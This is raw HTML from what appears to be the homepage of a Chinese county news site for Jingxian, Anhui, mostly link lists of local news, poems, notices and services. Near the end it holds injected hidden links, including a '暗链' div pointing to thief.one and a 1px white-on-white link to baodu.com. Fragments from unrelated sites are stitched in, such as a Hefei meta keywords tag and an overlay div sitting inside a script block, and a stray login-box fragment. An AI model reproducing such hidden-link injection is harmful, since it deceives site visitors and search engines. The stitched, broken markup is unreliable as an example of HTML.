                                                                            <a href="http://www.jxnn.cn/index.php?id=60888" target="_blank">[安徽新闻联播]周东红：千年技艺“掌帘人”</a>
                                                                        </li>
                                                                      <li>
                                                                            <a href="http://www.jxnn.cn/index.php?id=60870" target="_blank">[宣城日报]泾县坚持“绿色发展”守护蓝天碧</a>
                                                                        </li>
                                                                      <li>
                                                                            <a href="http://www.jxnn.cn/index.php?id=60869" target="_blank">[中国宣城网]泾县：“产业变绿 绿变产业”天</a>
                                                                        </li>
                                                                      <li>
                                                                            <a href="http://www.jxnn.cn/index.php?id=60805" target="_blank">[安徽日报]爱心救援从一个人到一个团队</a>
                                                                        </li>
                                                                      <li>
                                                                            <a href="http://www.jxnn.cn/index.php?id=60719" target="_blank">[宣城日报]泾县：聚力“五大会战”促发展</a>
                                                                        </li>
                                                    				</ul>
              				</div>
            			</div>
            	<div class="swiper-slide swiper-slide-next" style="width: 375px;">
              		<div class="content-slide">
                		<ul class="news-list">
                                                                                    <li>
                                                                <a href="http://www.jxnn.cn/index.php?id=61044" target="_blank">[人民网评]兴文化，书写中华民族新史诗</a>
                                                            </li>
                                                        <li>
                                                                <a href="http://www.jxnn.cn/index.php?id=60843" target="_blank">[人民网评]作业成买卖，莫要误入投机取巧的</a>
                                                            </li>
                                                        <li>
                                                                <a href="http://www.jxnn.cn/index.php?id=60612" target="_blank">[人民网评]新时代的改革开放必将引领潮流</a>
                                                            </li>
                                                        <li>
                                                                <a href="http://www.jxnn.cn/index.php?id=60281" target="_blank">[人民日报评论]保持定力，积极应对新问题新</a>
                                                            </li>
                                                        <li>
                                                                <a href="http://www.jxnn.cn/index.php?id=60207" target="_blank">[人民日报评论]为人类和平发展作出中国贡献</a>
                                                            </li>
                                                        <li>
                                                                <a href="http://www.jxnn.cn/index.php?id=59786" target="_blank">[人民日报评论]积蓄经济长江新动能</a>
                                                            </li>
                                            		</ul>
              		</div>
            	</div>
            	<div class="swiper-slide" style="width: 375px;">
              		<div class="content-slide">
                		<ul class="news-list">
                                                                                    <li>
												<a href="https://mp.weixin.qq.com/s/S7OXVtywllu5NNYxF87SJg" target="_blank">泾县城区非现场违停车辆曝光台（第三期）</a>
												
							</li>
                                                        <li>
												<a href="https://mp.weixin.qq.com/s/0ZifFdEk219BeOScDPKDug" target="_blank">“三伏天”已谢幕，紧接着将迎来一年中最凶</a>
												
							</li>
                                                        <li>
												<a href="https://mp.weixin.qq.com/s/ULpM_Y1sgtbIiO4MstNw6Q" target="_blank">我县集中整治千亩园路“乱搭乱建”</a>
												
							</li>
                                                        <li>
												<a href="https://mp.weixin.qq.com/s/jjzlu5KaVBJhxTLr83fkpw" target="_blank">注意了！8月26日—9月5日坐高铁去北京要二次</a>
												
							</li>
                                                        <li>
												<a href="https://mp.weixin.qq.com/s/tPfiDjXQyufUq8nIjE2giA" target="_blank">我县组织收看安徽省实施乡村振兴战略工作推</a>
												
							</li>
                                                        <li>
												<a href="https://mp.weixin.qq.com/s/H3UCMLEFz3OlQ6LYRwWXKg" target="_blank">凤子河里悠然“行驶”的“洋船”</a>
												
							</li>
                                            		</ul>
              </div>
            </div>

          </div>
        </div>

      </div>
    </div>
        </div>
            </div>
        <div class="jx_media1">
        	<div class="changeNew1">
      			<div class="newLs1">
        			<div class="jx_news">
          				<a href="index.php?id=demand&cate=shijiaojingxian" class="jx_active" target="_blank">视角泾县</a>
          				<a href="index.php?id=demand&cate=dianshixinwen" target="_blank">电视新闻</a>
                        <a href="index.php?id=demand" target="_blank">电视栏目</a>
        			</div>                   
        		<div class="boreds"></div>
        		<div id="jx-container" class="swiper-container swiper-container-horizontal">
          			<div class="swiper-wrapper">

            			<div class="swiper-slide swiper-slide-active" style="width: 377px; height:275px;">
              				<div class="content-slide">
                				<ul class="news-list1">
                                                                                                          <li>
                                  		<a href="http://www.jxnn.cn/index.php?id=61056" target="_blank">
       	 								<img src="res/img/201808/28/auto_59685.jpg" class="newImg">
        								<span class="an"></span>
                                        <span class="newt">我县组织收看安徽省实施乡村振兴战略工作推进电视电话会议</span>
      </a>
                                  </li>
                                                                      <li>
                                  		<a href="http://www.jxnn.cn/index.php?id=61054" target="_blank">
       	 								<img src="res/img/201808/28/auto_59683.jpg" class="newImg">
        								<span class="an"></span>
                                        <span class="newt">茂林镇、榔桥镇、蔡村镇分别召开人代会</span>
      </a>
                                  </li>
                                                                      <li>
                                  		<a href="http://www.jxnn.cn/index.php?id=61053" target="_blank">
       	 								<img src="res/img/201808/28/auto_59677.jpg" class="newImg">
        								<span class="an"></span>
                                        <span class="newt">我县集中整治千亩园路“乱搭乱建”</span>
      </a>
                                  </li>
                                                                      <li>
                                  		<a href="http://www.jxnn.cn/index.php?id=61052" target="_blank">
       	 								<img src="res/img/201808/28/auto_59675.jpg" class="newImg">
        								<span class="an"></span>
                                        <span class="newt">城区车辆违停曝光台（三）</span>
      </a>
                                  </li>
                                                    				</ul>
              				</div>
                            
                           
            			</div>
                        <div class="swiper-slide swiper-slide-active" style="width: 377px; height:275px;">
              				<div class="content-slide">
                				<ul class="news-list1">
                                                                                                            <li>
                                        <a href="http://www.jxnn.cn/index.php?id=60987" target="_blank">
                                            <img src="res/img/201808/26/auto_59610.jpg" class="newImg">
                                            <span class="an"></span>
                                            <span class="newt">20180825新闻周刊</span>
                                        </a>
                                    </li>
                                                                        <li>
                                        <a href="http://www.jxnn.cn/index.php?id=60981" target="_blank">
                                            <img src="res/picCover/auto_5625.jpg" class="newImg">
                                            <span class="an"></span>
                                            <span class="newt">20180824泾县新闻</span>
                                        </a>
                                    </li>
                                                                        <li>
                                        <a href="http://www.jxnn.cn/index.php?id=60968" target="_blank">
                                            <img src="res/picCover/auto_5625.jpg" class="newImg">
                                            <span class="an"></span>
                                            <span class="newt">20180823泾县新闻</span>
                                        </a>
                                    </li>
                                                                        <li>
                                        <a href="http://www.jxnn.cn/index.php?id=60915" target="_blank">
                                            <img src="res/picCover/auto_5625.jpg" class="newImg">
                                            <span class="an"></span>
                                            <span class="newt">20180822泾县新闻</span>
                                        </a>
                                    </li>
                                                    				</ul>
              				</div>
                            
                           
            			</div>
                        <div class="swiper-slide swiper-slide-active" style="width: 377px; height:275px;">
              				<div class="content-slide">
                				<ul class="news-list1">
                                                                                                                                                <li>
                                        <a href="http://www.jxnn.cn/index.php?id=demand&cate=baixingwenzheng" target="_blank">
                                            <img src="res/picCover/72cea7bd82fb1618.png" class="newImg">
                                            <span class="an"></span>
                                            <span class="newt">百姓问政</span>
                                        </a>
                                    </li>
                                                                                                                                                <li>
                                        <a href="http://www.jxnn.cn/index.php?id=demand&cate=fhxmx" target="_blank">
                                            <img src="res/picCover/22c5d46d42d69d8d.png" class="newImg">
                                            <span class="an"></span>
                                            <span class="newt">飞虹小明星</span>
                                        </a>
                                    </li>
                                                                                                                                                <li>
                                        <a href="http://www.jxnn.cn/index.php?id=demand&cate=rendazaixian" target="_blank">
                                            <img src="res/picCover/b348fa47a048c7ba.png" class="newImg">
                                            <span class="an"></span>
                                            <span class="newt">人大在线</span>
                                        </a>
                                    </li>
                                                                                                                                                                                                                        <li>
                                        <a href="http://www.jxnn.cn/index.php?id=demand&cate=zoujinnongjia" target="_blank">
                                            <img src="res/picCover/5b73352d4f82905b.png" class="newImg">
                                            <span class="an"></span>
                                            <span class="newt">走进农家</span>
                                        </a>
                                    </li>
                                                                                                                                                                                                                                        				</ul>
              				</div>
                            
                           
            			</div>


                   </div>
              </div>

      </div>
    </div>
        </div>
    </div>
    
    <!--文明曝光-->
    <div id="jx_exposurebg">
    	<div class="jx_exposure">
        	<!--文明曝光-->
        	<div class="exposure">
            	<div class="changeNew">
                    <div class="newLs1">
                        <div class="t-news"><!--tabs-->
                            <a href="index.php?id=exposure" class="t-active" target="_blank">文明曝光</a><!--active-->
                            <a href="index.php?id=splendid" target="_blank">“泾”彩故事</a>
                        </div>
                        <div class="boreds"></div>
                        <div id="t-news-container" class="swiper-container swiper-container-horizontal">
                            <div class="swiper-wrapper">
                                <div class="swiper-slide swiper-slide-active">
                                    <div class="content-slide">
                                        <ul class="news-list">
                                                                                                                                    <li>
											 									<a href="http://www.jxnn.cn/index.php?id=61034" target="_blank">文明创建：城区车辆违停曝光台（第三期）</a>
																				
											</li>
                                                                                        <li>
											                                        <a href="http://www.jxnn.cn/index.php?id=60600">文明创建：城区车辆违停曝光台（第二期）</a>
                                     											
											</li>
                                                                                        <li>
											 									<a href="http://www.jxnn.cn/index.php?id=60520" target="_blank">曝光台：行人闯红灯现象频频出现</a>
																				
											</li>
                                                                                        <li>
											 									<a href="http://www.jxnn.cn/index.php?id=60521" target="_blank">村民焚烧秸秆 严重污染环境</a>
																				
											</li>
                                                                                        <li>
											 									<a href="http://www.jxnn.cn/index.php?id=60405" target="_blank">桥面坑洼沙石堆积 交通安全受影响</a>
																				
											</li>
                                                                                        <li>
											 									<a href="http://www.jxnn.cn/index.php?id=60289" target="_blank">城区非机动车逆行现象严重 交通文明还需再提升</a>
																				
											</li>
                                                                                        <li>
											                                        <a href="http://www.jxnn.cn/index.php?id=60057">文明创建：城区车辆违停曝光台</a>
                                     											
											</li>
                                                                                        <li>
											 									<a href="http://www.jxnn.cn/index.php?id=7970" target="_blank">小区物业突然撤离 业主如何维权</a>
																				
											</li>
                                                                                    </ul>
                                    </div>
                                </div>
                                <div class="swiper-slide swiper-slide-next">
                                    <div class="content-slide">
                                        <ul class="news-list">
                                                                                                                                    <li>
											                                        <a href="http://www.jxnn.cn/index.php?id=60920">【纪念改革开放40周年】曹卫平：巾帼不让须眉</a>
                                     											</li>
                                                                                        <li>
											                                        <a href="http://www.jxnn.cn/index.php?id=60802">青春梦、师大梦、稼祥梦</a>
                                     											</li>
                                                                                        <li>
											                                        <a href="http://www.jxnn.cn/index.php?id=60767">胡秋红：赠人玫瑰，手有余香</a>
                                     											</li>
                                                                                        <li>
											 									<a href="http://www.jxnn.cn/index.php?id=60722" target="_blank">杨富全：带着女儿驻村扶贫</a>
																				</li>
                                                                                        <li>
											                                        <a href="http://www.jxnn.cn/index.php?id=60514">一学一做践真知，忆苦奋斗昂首行</a>
                                     											</li>
                                                                                        <li>
											                                        <a href="http://www.jxnn.cn/index.php?id=60472">淮师学子走红色足迹，进党员之家感悟乡村振兴</a>
                                     											</li>
                                                                                        <li>
											                                        <a href="http://www.jxnn.cn/index.php?id=60429">安徽师范大学环工学院赴泾县污染源调研团队纪实</a>
                                     											</li>
                                                                                        <li>
											                                        <a href="http://www.jxnn.cn/index.php?id=60426">探寻汉家旧县 保护传统文化</a>
                                     											</li>
                                                                                    </ul>
                                    </div>
                                </div>


                            </div>
                        </div>

                    </div>
    </div>
            </div>

           

            <!--法制泾县-->
            <div class="institution">

        	<div class="changeNew1">
      			<div class="newLs1">
        			<div class="w-news"><!--tabs-->
          				<a href="index.php?id=government" class="w-active" target="_blank">法治泾县</a><!--active-->
          				<a href="index.php?id=ramble" target="_blank">文苑漫步</a>
          				<a href="index.php?id=jxgd" target="_blank">泾县广电</a>
        			</div>
        		<div class="boreds"></div>
        		<div id="w-news-container" class="swiper-container swiper-container-horizontal">
          			<div class="swiper-wrapper">
            			<div class="swiper-slide swiper-slide-active" style="width: 375px;">
              				<div class="content-slide">
                				<ul class="news-list">
                                                                                                            <li>
									                                        <a href="http://www.jxnn.cn/index.php?id=60938">百般谎言骗取钱财 东窗事发难逃法网</a>
                                     									</li>
                                                                        <li>
									                                        <a href="http://www.jxnn.cn/index.php?id=60937">速执团队高温出击 送款上门解民忧</a>
                                     									</li>
                                                                        <li>
									                                        <a href="http://www.jxnn.cn/index.php?id=60854">兄弟“义气”聚众斗殴 一言不合惹事生“罚”</a>
                                     									</li>
                                                                        <li>
									                                        <a href="http://www.jxnn.cn/index.php?id=60806">合伙经商委托他人代持股份 诉至法院要求确认被驳回</a>
                                     									</li>
                                                                        <li>
									                                        <a href="http://www.jxnn.cn/index.php?id=60720">如约完工被拖款项 几经索要被拒诉至法院获支持</a>
                                     									</li>
                                                                        <li>
									                                        <a href="http://www.jxnn.cn/index.php?id=60681">被狗咬伤感染致残 五年维权获赔偿</a>
                                     									</li>
                                                                        <li>
									                                        <a href="http://www.jxnn.cn/index.php?id=60632">持矛聚众斗殴 泾县涉恶团伙被批捕</a>
                                     									</li>
                                                                        <li>
									                                        <a href="http://www.jxnn.cn/index.php?id=60631">挖坑填埋限制人身自由 四人因非法拘禁他人获刑</a>
                                     									</li>
                                                    				</ul>
              				</div>
            			</div>
            	<div class="swiper-slide swiper-slide-next" style="width: 375px;">
              		<div class="content-slide">
                		<ul class="news-list">
                                                                                    <li>
							                                        <a href="http://www.jxnn.cn/index.php?id=61045">采桑子·秋收（黄少平/文）</a>
                                     							
							</li>
                                                        <li>
							                                        <a href="http://www.jxnn.cn/index.php?id=61024">秋江（朱德仁/文）</a>
                                     							
							</li>
                                                        <li>
							                                        <a href="http://www.jxnn.cn/index.php?id=60964">浣溪沙·晨练象山公园（黄少平/文）</a>
                                     							
							</li>
                                                        <li>
							                                        <a href="http://www.jxnn.cn/index.php?id=60962">山村即景（朱德仁/文）</a>
                                     							
							</li>
                                                        <li>
							                                        <a href="http://www.jxnn.cn/index.php?id=60890">定风坡·敬亭山（自然/文）</a>
                                     							
							</li>
                                                        <li>
							                                        <a href="http://www.jxnn.cn/index.php?id=60851">风入松 桃花潭之行（朱德仁/文）</a>
                                     							
							</li>
                                                        <li>
							                                        <a href="http://www.jxnn.cn/index.php?id=60803">水调歌头 绩溪行（朱德仁/文）</a>
                                     							
							</li>
                                                        <li>
							                                        <a href="http://www.jxnn.cn/index.php?id=60800">【那年那月】茂林竹器社逸事（翟大雷/文）</a>
                                     							
							</li>
                                            		</ul>
              		</div>
            	</div>
            	<div class="swiper-slide" style="width: 375px;">
              		<div class="content-slide">
                		<ul class="news-list">
                                                                                    <li>
							 									<a href="http://www.jxnn.cn/index.php?id=60594" target="_blank">关于泾县广电台广场东侧绿化道路拓宽工程的公示</a>
																
							</li>
                                                        <li>
							 									<a href="http://www.jxnn.cn/index.php?id=60339" target="_blank">泾县广播发射台室外桥架工程(二次)投标邀请书</a>
																
							</li>
                                                        <li>
							 									<a href="http://www.jxnn.cn/index.php?id=60155" target="_blank">泾县广播电视发射台室外桥架工程流标公示</a>
																
							</li>
                                                        <li>
							 									<a href="http://www.jxnn.cn/index.php?id=59967" target="_blank">泾县广播电视发射台室外桥架工程投标邀请书</a>
																
							</li>
                                                        <li>
							 									<a href="http://www.jxnn.cn/index.php?id=59802" target="_blank">泾县广播电视台室内大屏幕招标公告</a>
																
							</li>
                                                        <li>
							                                        <a href="http://www.jxnn.cn/index.php?id=59707">关于泾县广电台新建PVC膜停车棚工程的公示</a>
                                     							
							</li>
                                                        <li>
							                                        <a href="http://www.jxnn.cn/index.php?id=59404">泾县广电中心宣传栏制作及安装确定施工单位的公示</a>
                                     							
							</li>
                                                        <li>
							 									<a href="https://mp.weixin.qq.com/s/0Rwz7H2cd4I4U_jDRvfXcQ" target="_blank">飞虹少儿艺术中心举行暑期集体生日会暨汇报演出</a>
																
							</li>
                                            		</ul>
              </div>

          </div>
        </div>

      </div>
    </div>
        </div>

            </div>
            
        </div>
        <!--公益展播-->
            <div class="publicbg">
        	<div class="public">
            	<img src="tpl/www/images/13_03.png" />
            </div>
            <div class="public1">
            	<ul>
                                                            <li><a href="http://www.wenming.cn/jwmsxf_294/zggygg/" target="_blank"><img src="res/imgad/20180108/auto_1741.png" /><div class="public2">公益广告</div></a></li>
                                        <li><a href="http://www.ahjxqn.gov.cn/NewsList.aspx?ClassID=10951098" target="_blank"><img src="res/imgad/20180108/auto_1742.png" /><div class="public2">志愿服务</div></a></li>
                                        <li><a href="http://www.jxwm.gov.cn/c/131.html" target="_blank"><img src="res/imgad/20180108/auto_1743.png" /><div class="public2">道德楷模</div></a></li>
                                        <li><a href="http://www.wenming.cn/specials/zxdj/hxjz/tsjz2016/wf/" target="_blank"><img src="res/imgad/20180108/auto_1744.png" /><div class="public2">文化墙</div></a></li>
                                    </ul>
            </div>
        </div>
    </div>
    
	<!--美丽泾县-->
    <div id="jx_beautybg">
    	<div class="beautybg">
        	<div class="beauty">
            	<div class="top_media">
                    <a href="index.php?id=beautyjx" target="_blank"><img src="tpl/www/images/45_03.png" class="meiti"/></a>
                    <a href="index.php?id=beautyjx" target="_blank"><img src="tpl/www/images/46_03.png" class="shuimo"/></a>
            </div>
                <div class="beauty3">
                    <ul>

                      

                        
                                                <li>
                            <a href="http://www.jxnn.cn/index.php?id=60388" title="石梦飞天徐英斌" target="_blank">
                                 								  <img src="res/img/201808/07/96cdf1bf83ed2b5c.jpg"/>
                                 								<span id="IfId" style="display: none;">石梦飞天徐英斌</span>
                            </a>
                        </li>
                                                <li>
                            <a href="http://www.jxnn.cn/index.php?id=59949" title="烧窑人" target="_blank">
                                                                 <img src="res/img/201807/23/ba31bdb5da73e43f.jpg"/>
                                   								<span id="IfId" style="display: none;">烧窑人</span>
                            </a>
                        </li>
                                                <li>
                            <a href="http://www.jxnn.cn/index.php?id=59756" title="高温下的坚守：供电工人山中架线" target="_blank">
                                 								  <img src="res/img/201807/17/97ef9ec40ddc7a52.jpg"/>
                                 								<span id="IfId" style="display: none;">高温下的坚守：供电工人山中架线</span>
                            </a>
                        </li>
                                                <li>
                            <a href="http://www.jxnn.cn/index.php?id=59706" title="七月泾川，赏醉美荷花！" target="_blank">
                                                                 <img src="res/img/201807/16/a7a9635ecf8526aa.jpg"/>
                                   								<span id="IfId" style="display: none;">七月泾川，赏醉美荷花！</span>
                            </a>
                        </li>
                                                <li>
                            <a href="http://www.jxnn.cn/index.php?id=59702" title="翟大满：耄耋老人造龙舟" target="_blank">
                                 								  <img src="res/img/201807/16/c5212f02c10c436e.jpg"/>
                                 								<span id="IfId" style="display: none;">翟大满：耄耋老人造龙舟</span>
                            </a>
                        </li>
                                                <li>
                            <a href="http://www.jxnn.cn/index.php?id=58969" title="青纱薄雾覆绿水 美不胜收桃花潭" target="_blank">
                                 								  <img src="res/img/201806/20/92f199bc28f8b12d.jpg"/>
                                 								<span id="IfId" style="display: none;">青纱薄雾覆绿水 美不胜收桃花潭</span>
                            </a>
                        </li>
                        


                    </ul>

                 

                </div>
            </div>
        </div>

        <script type="text/javascript">
                $(".beauty3 ul li").eq(0).addClass("first");
                $(".beauty3 ul li").eq(1).addClass("three");
                $(".beauty3 ul li").eq(2).addClass("four");
                $(".beauty3 ul li").eq(3).addClass("five");
                $(".beauty3 ul li").eq(4).addClass("six");
                $(".beauty3 ul li").eq(5).addClass("seven");
        </script>

         <!--服务指南-->
        <div class="servicebg">
        	<div class="service">
            	<div class="service1">服务指南</div>
                <div class="service2">
                	<ul>
                                                                                            	<li><a href="http://60.173.113.163:8090/" target="_blank"><img src="res/ico/auto_1705.png" /><span>社保查询</span></a></li>
                                                                                                <li><a href="http://www.jxnn.cn/index.php?id=fuwuzhinanxm&cate=gongjiaoxianlu" target="_blank"> <img src="res/ico/auto_1704.png" /><span>公交线路</span></a></li>
                                                                                                <li><a href="http://www.jxnn.cn/index.php?id=fuwuzhinanxm&cate=kuaidigongsi" target="_blank"> <img src="res/ico/auto_1703.png" /><span>快递公司</span></a></li>
                                                                                            	<li><a href="http://www.122.gov.cn/m/map/select" target="_blank"><img src="res/ico/auto_1702.png" /><span>交通违章</span></a></li>
                                                                                                <li><a href="http://www.jxnn.cn/index.php?id=fuwuzhinanxm&cate=jfsdf" target="_blank"> <img src="res/ico/auto_1700.png" /><span>缴费水电费</span></a></li>
                                                                                                <li><a href="http://www.jxnn.cn/index.php?id=fuwuzhinanxm&cate=fayuankaiting" target="_blank"> <img src="res/ico/auto_1701.png" /><span>法院开庭</span></a></li>
                                                                                            	<li><a href="https://sso.ahzwfw.gov.cn/uccp-server/login?service=http%3a%2f%2fwww.xcgjj.cn%3a8081%2fSzCasLogin%2ftSingle.aspx&appCode=8bda7b91ebd640f38f8a3bb86b26a36c" target="_blank"><img src="res/ico/auto_1699.png" /><span>公积金查询</span></a></li>
                                                                                            	<li><a href="http://www.12306.cn/mormhweb/" target="_blank"><img src="res/img/201712/23/auto_1698.png" /><span>高铁查询</span></a></li>
                                                                    </ul>
                </div>
            </div>
        </div>
    </div>
	
	<!--相关链接-->
    <div id="linkbg">
    	<div class="link">
        	<div class="link1">相关链接</div>
            
        </div>
		<div class="link2">
            	<ul>
                                                        	<li><a href="http://www.people.com.cn/" target="_blank"><img src="res/img/201801/04/3ac162b76cd6fdd9.png" /></a></li>
                                    	<li><a href="http://www.xinhuanet.com/" target="_blank"><img src="res/img/201801/04/90ba5987d6d099b6.png" /></a></li>
                                    	<li><a href="http://www.china.com.cn/" target="_blank"><img src="res/img/201804/04/73e09c034f52c774.png" /></a></li>
                                    	<li><a href="http://www.chinanews.com/index.shtml" target="_blank"><img src="res/img/201804/04/58cef030d10693df.png" /></a></li>
                                    	<li><a href="http://www.cnr.cn/" target="_blank"><img src="res/img/201804/04/c6099cb446e35614.png" /></a></li>
                                    	<li><a href="http://www.anhuinews.com/" target="_blank"><img src="res/img/201804/04/271a2ff5f9d6bb84.png" /></a></li>
                                    	<li><a href="http://www.cctv.com/" target="_blank"><img src="res/img/201804/04/3464dc894ac3518d.png" /></a></li>
                                    	<li><a href="http://www.ahtv.cn/" target="_blank"><img src="res/img/201804/04/93c61a66b95524be.png" /></a></li>
                                    	<li><a href="http://www.xuanwww.com/" target="_blank"><img src="res/img/201804/04/c0710205b49effe3.png" /></a></li>
                                    	<li><a href="http://www.newsxc.com/" target="_blank"><img src="res/img/201804/04/dd0db7362babbfb2.png" /></a></li>
                                    	<li><a href="http://xc.wenming.cn/" target="_blank"><img src="res/img/201804/04/f98b4b7d25e8f895.png" /></a></li>
                                    	<li><a href="http://www.ahjx.gov.cn/" target="_blank"><img src="res/img/201804/04/cdb477114a08793f.png" /></a></li>
                                    	<li><a href="http://www.ahjxrd.gov.cn/" target="_blank"><img src="res/img/201804/04/1957ee5988e5a1fa.png" /></a></li>
                                    	<li><a href="http://www.xcjxxf.gov.cn/" target="_blank"><img src="res/img/201804/04/4c0888de90fa906a.png" /></a></li>
                                    	<li><a href="http://www.jxwm.gov.cn/" target="_blank"><img src="res/img/201804/04/c8983f7738fba1ea.png" /></a></li>
                                    	<li><a href="http://www.newshs.com/" target="_blank"><img src="res/img/201804/04/3ea0d49d8dd0908e.png" /></a></li>
                                    	<li><a href="http://cxnews.zjol.com.cn/" target="_blank"><img src="res/img/201804/04/ca71fa6c7bd89afb.png" /></a></li>
                                    	<li><a href="http://ajnews.zjol.com.cn/" target="_blank"><img src="res/img/201804/04/0e12d4800103cc77.png" /></a></li>
                                    	<li><a href="http://www.xcnsw.com/" target="_blank"><img src="res/img/201804/04/385fac63392c9591.png" /></a></li>
                                    	<li><a href="http://www.ahjxqn.gov.cn/" target="_blank"><img src="res/img/201805/29/d97bd3c867b02cb9.jpg" /></a></li>
                                    </ul>
            </div>
    </div>
    
    <!--页脚-->
    <div id="footerbg">
    	<div class="footer">
        	<div class="footer1">
            	<a href="http://bszs.conac.cn/sitename?method=show&id=08BFC90F3E266057E053012819AC788E"><img src="tpl/www/images/27.png" class="c1"/></a>
                <a href="http://www.12377.cn/" target="_blank"><img src="tpl/www/images/28.png" class="c2"/></a>
            </div>
            <div class="footer2">
            	<div><p>主办：中共泾县县委、泾县人民政府 &nbsp; &nbsp;主管：泾县县委宣传部 &nbsp; &nbsp;承办：泾县广播电视台</p><p>&nbsp;地址：泾县泾川镇幕桥路广电中心五楼 &nbsp; 泾县新闻网版权所有 未经允许 请勿复制或镜像</p><p>网站公安备案号：3418230034 &nbsp;ICP备案：皖ICP备13013327号-1 &nbsp;新闻资质网站备案号：皖网宣备080001号&nbsp;</p>
                </div>
                <div class="copyImg">皖公安备案：34182302000001号</div>
                <div class="onlineP">

                    <script type="text/javascript">
                                                var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
                        document.write(unescape("%3Cspan id='cnzz_stat_icon_1273476167'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/stat.php%3Fid%3D1273476167%26online%3D2' type='text/javascript'%3E%3C/script%3E"));
                    </script>
                                    </div>

            </div>
        </div>
    </div>


    <!--返回顶部-->
    <div class="bottom_tools">
       
        <!--<div class="qr_tool" title=""></div>-->
        <a class="qr_comment" title="留言" href="index.php?id=book"></a>
        <a id="scrollUp" href="javascript:;" title="飞回顶部"></a>

    </div>

<!--返回顶部-->
<script type="text/javascript">
    $(function(){
        var $body = $(document.body);;
        var $bottomTools = $('.bottom_tools');
        var $qrTools = $('.qr_tool');
        var qrImg = $('.qr_img');
        $(window).scroll(function () {
            var scrollHeight = $(document).height();
            var scrollTop = $(window).scrollTop();
            var $footerHeight = $('.page-footer').outerHeight(true);
            var $windowHeight = $(window).innerHeight();
            scrollTop > 50 ? $("#scrollUp").fadeIn(200).css("display","block") : $("#scrollUp").fadeOut(200);
            $bottomTools.css("bottom", scrollHeight - scrollTop - $footerHeight > $windowHeight ? 40 : $windowHeight + scrollTop + $footerHeight + 40 - scrollHeight);
        });
        $('#scrollUp').click(function (e) {
            e.preventDefault();
            $('html,body').animate({ scrollTop:0});
        });
        $qrTools.hover(function () {
            qrImg.fadeIn();
        }, function(){
            qrImg.fadeOut();
        });
    });

</script>

    <!--幻灯加切换-->
	<script type="text/javascript">
    window.onload = function() {
		//幻灯
        var mySwiper2 = new Swiper('.abc',{
            autoplay:4000,
			preventClicks:false,
            visibilityFullFit : true,
            loop:true,
            pagination : '.pagination',
            paginationClickable: true,
            autoplayDisableOnInteraction: false,
            effect : 'fade',
            fade: {
                crossFade: false,
            }
        });




//文明曝光
        var tSwiper = new Swiper('#t-news-container',{
			preventClicks:false,
            speed:500,
            onSlideChangeStart: function(){
                $(".t-news .t-active").removeClass('t-active')
                $(".t-news a").eq(tSwiper.activeIndex).addClass('t-active')
            }
        })
        $(".t-news a").mouseover('touchstart mousedown',function(e){
            e.preventDefault()
            $(".t-news .t-active").removeClass('t-active')
            $(this).addClass('t-active')
            tSwiper.slideTo( $(this).index() )
        })


		//泾县切换
        var tabsSwiper = new Swiper('#tabs-container',{
            speed:500,
			preventClicks:false,
            onSlideChangeStart: function(){
                $(".tabs .active").removeClass('active')
                $(".tabs a").eq(tabsSwiper.activeIndex).addClass('active')
            }
        })
        <meta content="中国 安徽 合肥 合肥报业网 合肥在线 今日生活报 合肥晚报 江淮晨报 东方体育报 逍遥津 环湖晨刊 anhui hefei hfwb jhcb xyj hf365" name="keywords"/>

        $(".tabs a").eq(0).addClass('active');
        $(".tabs a").mouseover('touchstart mousedown',function(e){
            e.preventDefault()

            $(".tabs .active").removeClass('active')
            $(this).addClass('active')
            tabsSwiper.slideTo( $(this).index() )
        })
<div class="thisisazhezhaoceng" style="position:absloute;left:0;top:0;z-index:999;width:90%;height:100px">这是一个遮罩层
</div>
		
	//外媒看泾县
	 var twSwiper = new Swiper('#tw-news-container',{
           preventClicks:false,
            onSlideChangeStart: function(){
                $(".tw-news .tw-active").removeClass('tw-active')
                $(".tw-news a").eq(twSwiper.activeIndex).addClass('tw-active')
            }
        })
        $(".tw-news a").eq(0).addClass('tw-active');
        $(".tw-news a").mouseover('touchstart mousedown',function(e){
            e.preventDefault()
            $(".tw-news .tw-active").removeClass('tw-active')
            $(this).addClass('tw-active')
            twSwiper.slideTo( $(this).index() )
        })

		
		
		//文明曝光





    //法制泾县
		var wSwiper = new Swiper('#w-news-container',{
			preventClicks:false,
            speed:500,
            onSlideChangeStart: function(){
                $(".w-news .w-active").removeClass('w-active')
                $(".w-news a").eq(wSwiper.activeIndex).addClass('w-active')
            }
        })
        $(".w-news a").mouseover('wouchstart mousedown',function(e){
            e.preventDefault()
            $(".w-news .w-active").removeClass('w-active')
            $(this).addClass('w-active')
            wSwiper.slideTo( $(this).index() )
        })
		
		//视角泾县
		var jxSwiper = new Swiper('#jx-container',{
			preventClicks:false,
            speed:500,
            onSlideChangeStart: function(){
                $(".jx_news .jx_active").removeClass('jx_active')
                $(".jx_news a").eq(jxSwiper.activeIndex).addClass('jx_active')
            }
        })
        $(".jx_news a").mouseover('jxouchstart mousedown',function(e){
            e.preventDefault()
            $(".jx_news .jx_active").removeClass('jx_active')
            $(this).addClass('jx_active')
            jxSwiper.slideTo( $(this).index() )
        })

    }


</script>


    <!--中部广告-->
    <script type="text/javascript">
		$(document).ready(function(){
		$(".scrollleft1").imgscroll({
		speed: 40,    //图片滚动速度
		amount: 0,    //图片滚动过渡时间
		width: 1,     //图片滚动步数
		dir: "left"   // "left" 或 "up" 向左或向上滚动
		});

		});
		if($.browser.msie && parseInt($.browser.version, 10) < 7)
		{
			$(document).ready(function(){
		 		$(window).scroll(function(){
			 		$("#to_top").css({top:$(this).scrollTop()+$(this).height()-200});
		 		});
			});
		}
	</script>
	yxkj55.com
<div id="anlian"><a href="http://thief.one">暗链</a></div>
<script language=javascript>
document.getElementById("anlisfdgdfgd-dhsrrr1").style.display="none"
</script>
<a href="www.baodu.com" style="color:#FFFFFF; color:#FFFFFF;color:#FFFFFF;font-size:1px; line-height:1px;">测试连接</a>
<!--书记-->

<script type="text/javascript">

    $(document).ready(function () {

        var exchange = function(a,b){
            var n = a.next(), p = b.prev();
            b.insertBefore(n);
            a.insertAfter(p);

        };

    })

</script>
<div id=append_parent>
<div id=msgwin style=position:absolute; z-index: 100000; opacity: 1; display: none;><a href=javascript:; id=reload_qrcode>请点击刷新</a> </div></div>
</div>
<!--showface.end -->
<!-- 4.0登录框 new-->
<!-- views/portal/user/_user_login -->
<link href=http://cdn.css.huijiaoyun.com/tianyu_edu/area/320585/css/topnew.css?v=1537525308 rel=stylesheet type=text/css/>
<div class=m_login fm_login id=m_login>
